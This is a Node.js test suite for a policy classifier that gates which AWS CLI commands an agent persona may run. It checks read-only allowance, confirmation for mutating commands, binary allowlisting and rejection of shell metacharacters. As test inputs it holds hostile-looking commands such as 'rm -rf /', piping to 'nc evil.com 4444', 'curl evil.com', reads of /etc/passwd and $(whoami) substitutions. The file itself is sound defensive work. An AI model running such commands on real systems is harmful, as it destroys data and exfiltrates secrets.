const { test } = require('node:test');
const assert = require('node:assert/strict');

const { classify } = require('./commandPolicy');
const { POLICY_VERDICTS } = require('./policyVerdicts');

const AWS_ONLY = ['aws'];

function run(commandString, personaAllowedBinaries = AWS_ONLY) {
  return classify({
    mode: 'CSP',
    subMode: 'AWS',
    commandString,
    personaAllowedBinaries,
  });
}

// --- read-only -------------------------------------------------------------

test('allows a read-only describe- command', () => {
  const result = run('aws ec2 describe-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.equal(result.reason, null);
  assert.equal(result.dryRunCapable, false);
  assert.deepEqual(result.argv, ['aws', 'ec2', 'describe-instances']);
  assert.equal(result.binary, 'aws');
  assert.equal(result.verb, 'describe-instances');
});

test('the read-only verb-prefix rule is service-agnostic', () => {
  const result = run('aws s3api list-buckets');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.equal(result.verb, 'list-buckets');
});

test('allows a get- prefixed read-only command', () => {
  const result = run('aws iam get-user --user-name alice');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.equal(result.verb, 'get-user');
});

// --- mutating --------------------------------------------------------------

test('requires confirmation for a mutating command with dry-run support', () => {
  const result = run('aws ec2 terminate-instances --instance-ids i-123');
  assert.equal(result.verdict, POLICY_VERDICTS.REQUIRE_CONFIRMATION);
  assert.equal(result.reason, null);
  assert.equal(result.dryRunCapable, true);
  assert.equal(result.binary, 'aws');
  assert.equal(result.verb, 'terminate-instances');
});

test('requires confirmation for a mutating command without dry-run support', () => {
  const result = run('aws s3api create-bucket --bucket foo');
  assert.equal(result.verdict, POLICY_VERDICTS.REQUIRE_CONFIRMATION);
  assert.equal(result.dryRunCapable, false);
  assert.equal(result.verb, 'create-bucket');
});

test('treats run-instances as mutating despite having no mutating prefix', () => {
  const result = run('aws ec2 run-instances --image-id ami-123');
  assert.equal(result.verdict, POLICY_VERDICTS.REQUIRE_CONFIRMATION);
  assert.equal(result.dryRunCapable, true);
  assert.equal(result.verb, 'run-instances');
});

test('does not mark a dry-run-capable EC2 verb as dry-run capable on another service', () => {
  const result = run('aws autoscaling create-tags --tags foo');
  assert.equal(result.verdict, POLICY_VERDICTS.REQUIRE_CONFIRMATION);
  assert.equal(result.dryRunCapable, false);
});

test('a mutating EC2 verb outside the curated dry-run list is not dry-run capable', () => {
  const result = run('aws ec2 modify-instance-attribute --instance-id i-123');
  assert.equal(result.verdict, POLICY_VERDICTS.REQUIRE_CONFIRMATION);
  assert.equal(result.dryRunCapable, false);
});

// --- --help ----------------------------------------------------------------

test('--help on a read-only verb is a lookup', () => {
  const result = run('aws ec2 describe-instances --help');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_LOOKUP);
  assert.equal(result.reason, null);
  assert.equal(result.dryRunCapable, false);
  assert.equal(result.verb, 'ec2');
});

test('--help on a mutating verb is still a lookup, not a confirmation', () => {
  const result = run('aws ec2 terminate-instances --help');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_LOOKUP);
  assert.equal(result.verb, 'ec2');
});

test('--help on an otherwise unrecognized verb is still a lookup', () => {
  const result = run('aws ec2 frobnicate-instances --help');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_LOOKUP);
  assert.equal(result.verb, 'ec2');
});

test('top-level --help is a lookup and reports argv[1] as the verb', () => {
  const result = run('aws --help');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_LOOKUP);
  assert.deepEqual(result.argv, ['aws', '--help']);
  assert.equal(result.verb, '--help');
});

test('--help does not bypass the binary allowlist', () => {
  const result = run('curl --help');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
});

test('--help does not bypass shell metacharacter rejection', () => {
  const result = run('aws ec2 describe-instances --help && curl evil.example');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Shell operators or metacharacters are not allowed');
});

// --- default-deny ----------------------------------------------------------

test('rejects an unrecognized operation (default-deny)', () => {
  const result = run('aws ec2 frobnicate-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(
    result.reason,
    'Unrecognized operation "frobnicate-instances" -- neither a known read-only nor mutating pattern',
  );
  assert.equal(result.dryRunCapable, false);
  assert.equal(result.verb, null);
});

test('operation matching is case-sensitive, so a cased variant is rejected', () => {
  const result = run('aws ec2 Describe-Instances');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.match(result.reason, /^Unrecognized operation/);
});

test('rejects an operation that merely contains, rather than starts with, a read-only prefix', () => {
  const result = run('aws ec2 xdescribe-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.match(result.reason, /^Unrecognized operation/);
});

test('rejects a read-only-looking flag smuggled into the operation position', () => {
  const result = run('aws ec2 --output describe-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.match(result.reason, /^Unrecognized operation/);
});

// --- binary allowlist ------------------------------------------------------

test('rejects a binary that is not in the persona allowlist', () => {
  const result = run('curl http://evil.example');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Binary "curl" is not allowed in this mode');
  assert.equal(result.binary, 'curl');
  assert.equal(result.verb, null);
});

test('rejects everything when the allowlist is empty', () => {
  const result = run('aws ec2 describe-instances', []);
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Binary "aws" is not allowed in this mode');
});

test('rejects when the allowlist is missing entirely', () => {
  const result = classify({
    mode: 'CSP',
    subMode: 'AWS',
    commandString: 'aws ec2 describe-instances',
  });
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Binary "aws" is not allowed in this mode');
});

test('binary matching is exact, not a prefix or path match', () => {
  assert.equal(run('/usr/bin/aws ec2 describe-instances').verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(run('aws2 ec2 describe-instances').verdict, POLICY_VERDICTS.REJECTED);
});

// --- shell metacharacters --------------------------------------------------

const METACHARACTER_COMMANDS = [
  'aws ec2 describe-instances && curl evil.com',
  'aws ec2 describe-instances; rm -rf /',
  'aws ec2 describe-instances | nc evil.com 4444',
  'aws ec2 describe-instances > /etc/passwd',
  'aws ec2 describe-instances || curl evil.com',
  'aws ec2 describe-instances < /etc/passwd',
  'aws ec2 describe-instances >> /tmp/out',
  'aws ec2 describe-instances # rm -rf /',
  'aws ec2 describe-instances --filters *',
];

for (const commandString of METACHARACTER_COMMANDS) {
  test(`rejects shell metacharacters: ${commandString}`, () => {
    const result = run(commandString);
    assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
    assert.equal(result.reason, 'Shell operators or metacharacters are not allowed');
    assert.deepEqual(result.argv, []);
    assert.equal(result.binary, null);
    assert.equal(result.verb, null);
  });
}

test('rejects an unquoted $() substitution as a shell operator', () => {
  const result = run('aws ec2 describe-instances --filters $(whoami)');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Shell operators or metacharacters are not allowed');
});

// --- defense-in-depth substring check --------------------------------------

test('rejects a backtick inside an otherwise well-formed argument', () => {
  const result = run('aws ec2 describe-instances --filters `whoami`');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command contains disallowed characters');
  assert.deepEqual(result.argv, []);
  assert.equal(result.binary, null);
});

test('rejects a quoted $( substitution that survives tokenization as a plain string', () => {
  const result = run('aws ec2 describe-instances --filters "$(whoami)"');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command contains disallowed characters');
});

test('rejects a quoted backtick that survives tokenization as a plain string', () => {
  const result = run('aws ec2 describe-instances --filters "`whoami`"');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command contains disallowed characters');
});

test('the disallowed-character check runs before the binary allowlist', () => {
  const result = run('`evil` ec2 describe-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command contains disallowed characters');
});

// --- executor contract -----------------------------------------------------
//
// These pin behaviours that are safe ONLY because the executor spawns the
// returned `argv` array directly, with no shell. They are regression tests for
// the contract, not endorsements of the inputs: a caller that ever joined argv
// back into a string and handed it to a shell would turn each of these into a
// live injection. The orchestrator/sandbox task must exec argv, never a string.

test('a quoted shell metacharacter survives as one literal argv token', () => {
  // `;` inside quotes is data, not an operator, so shell-quote hands it back as
  // a plain string. Executed as argv this is one nonsensical operation name
  // that the AWS CLI rejects; concatenated into a shell it would not be.
  const result = run("aws ec2 'describe-instances;rm -rf /'");
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.deepEqual(result.argv, ['aws', 'ec2', 'describe-instances;rm -rf /']);
  assert.equal(result.verb, 'describe-instances;rm -rf /');
});

test('a newline separates tokens rather than acting as a command separator', () => {
  const result = run('aws ec2 describe-instances\n rm -rf /');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.deepEqual(result.argv, ['aws', 'ec2', 'describe-instances', 'rm', '-rf', '/']);
});

test('an unset $VAR expands to an empty token, so argv differs from the input string', () => {
  // shell-quote performs variable expansion with no environment, silently
  // emptying $VAR. Callers must audit and execute `argv`, never re-parse or
  // display the original commandString as if it were what ran.
  const result = run('aws $FOO describe-instances');
  assert.equal(result.verdict, POLICY_VERDICTS.ALLOW_READONLY);
  assert.deepEqual(result.argv, ['aws', '', 'describe-instances']);

  // The same expansion in the operation position lands on default-deny.
  const emptied = run('aws ec2 $FOO');
  assert.equal(emptied.verdict, POLICY_VERDICTS.REJECTED);
  assert.match(emptied.reason, /^Unrecognized operation/);
});

// --- structure -------------------------------------------------------------

test('rejects an empty string', () => {
  const result = run('');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Empty command');
  assert.deepEqual(result.argv, []);
  assert.equal(result.binary, null);
  assert.equal(result.verb, null);
});

test('rejects a whitespace-only string as empty', () => {
  const result = run('   \t  ');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Empty command');
});

test('rejects a binary with no service or operation', () => {
  const result = run('aws');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command is missing a service or operation');
  assert.deepEqual(result.argv, ['aws']);
  assert.equal(result.binary, 'aws');
  assert.equal(result.verb, null);
});

test('rejects a binary and service with no operation', () => {
  const result = run('aws ec2');
  assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
  assert.equal(result.reason, 'Command is missing a service or operation');
});

test('rejects a non-string command string', () => {
  for (const value of [undefined, null, 42, {}, ['aws', 'ec2']]) {
    const result = classify({
      mode: 'CSP',
      subMode: 'AWS',
      commandString: value,
      personaAllowedBinaries: AWS_ONLY,
    });
    assert.equal(result.verdict, POLICY_VERDICTS.REJECTED);
    assert.equal(result.reason, 'Command could not be parsed');
  }
});

// --- mode is inert ---------------------------------------------------------

test('mode and subMode do not change the verdict', () => {
  const a = classify({
    mode: 'CSP',
    subMode: 'AWS',
    commandString: 'aws ec2 describe-instances',
    personaAllowedBinaries: AWS_ONLY,
  });
  const b = classify({
    mode: 'ANYTHING_ELSE',
    subMode: null,
    commandString: 'aws ec2 describe-instances',
    personaAllowedBinaries: AWS_ONLY,
  });
  assert.deepEqual(a, b);
});

// --- purity ----------------------------------------------------------------

test('does not mutate the caller-supplied allowlist', () => {
  const allowed = ['aws'];
  run('aws ec2 terminate-instances --instance-ids i-123', allowed);
  assert.deepEqual(allowed, ['aws']);
});

test('is deterministic across repeated calls', () => {
  const first = run('aws ec2 describe-instances');
  const second = run('aws ec2 describe-instances');
  assert.deepEqual(first, second);
});
